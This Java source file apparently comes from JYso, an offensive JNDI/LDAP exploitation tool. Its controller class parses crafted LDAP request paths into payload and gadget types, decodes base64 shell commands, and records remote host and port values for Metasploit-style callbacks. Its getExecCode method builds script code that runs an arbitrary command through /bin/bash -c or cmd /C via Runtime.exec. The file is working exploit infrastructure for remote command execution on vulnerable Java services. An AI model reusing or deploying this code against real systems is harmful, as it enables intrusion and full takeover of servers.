package com.qi4l.JYso.controllers;

import com.qi4l.JYso.enumtypes.GadgetType;
import com.qi4l.JYso.exceptions.IncorrectParamsException;
import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.utils.Utils;
import org.fusesource.jansi.Ansi;

import java.util.Locale;

public abstract class BaseLdapController implements LdapController {

    public static String getString(String base, int index) {
        int cursor = 0;
        int found = 0;
        while (cursor < base.length()) {
            int nextSlash = base.indexOf('/', cursor);
            if (nextSlash == -1) nextSlash = base.length();

            if (nextSlash > cursor) {
                if (found == index) {
                    return base.substring(cursor, nextSlash);
                }
                found++;
            }
            cursor = nextSlash + 1;
        }
        return "";
    }

    static String getStringQ(String base, int index) {
        return getString(base, index);
    }

    public static String segment(String base, int index) {
        return getStringQ(base, index);
    }

    public static String suffixAfterDash(String value) {
        int dashIndex = value.indexOf('-');
        return dashIndex >= 0 ? value.substring(dashIndex + 1) : value;
    }

    public static GadgetType parseGadgetType(String base) throws UnSupportedPayloadTypeException {
        String segment = segment(base, 2);
        if (segment.isEmpty()) return null;

        try {
            return GadgetType.valueOf(segment.toLowerCase(Locale.ROOT));
        } catch (IllegalArgumentException ignored) {
            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + segment);
        }
    }

    public static String[] resolveParams(String base, GadgetType gadgetType) throws Exception {
        if (gadgetType == null) return new String[0];

        switch (gadgetType) {
            case base64:
                String cmd = Utils.getCmdFromBase(base);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                return new String[]{cmd};
            case shell:
                String encoded = Utils.getCmdFromBase(base);
                String decoded = Utils.base64Decode(encoded);
                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + decoded).reset());
                return decoded.split(" ");
            case msf:
                String[] results = Utils.getIPAndPortFromBase(base);
                Config.rhost = results[0];
                Config.rport = results[1];
                System.out.println("  RemoteHost: " + results[0]);
                System.out.println("  RemotePort: " + results[1]);
                return results;
            default:
                return new String[0];
        }
    }

    public static class ParseResult {
        public final String payloadType;
        public final GadgetType gadgetType;
        public final String[] params;

        ParseResult(String payloadType, GadgetType gadgetType, String[] params) {
            this.payloadType = payloadType;
            this.gadgetType = gadgetType;
            this.params = params;
        }
    }

    public static ParseResult parseBase(String base, String header) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        System.out.println(header);
        try {
            String normalized = base.replace('\\', '/');
            String payloadType = segment(normalized, 1);
            if (payloadType.isEmpty()) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
            }
            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());

            GadgetType gadgetType = parseGadgetType(normalized);
            String[] params = resolveParams(normalized, gadgetType);
            return new ParseResult(payloadType, gadgetType, params);
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    public static String getExecCode(String cmd) {
        return "var str_s=new Array(3);\n"
                + "if(java.io.File.separator.equals('/')){\n"
                + "str_s[0]='/bin/bash';\n"
                + "str_s[1]='-c';\n"
                + "str_s[2]='" + cmd + "';\n"
                + "}else{\n"
                + "str_s[0]='cmd';\n"
                + "str_s[1]='/C';\n"
                + "str_s[2]='" + cmd + "';\n"
                + "}\n"
                + "java.lang.Runtime.getRuntime().exec(str_s);";
    }
}
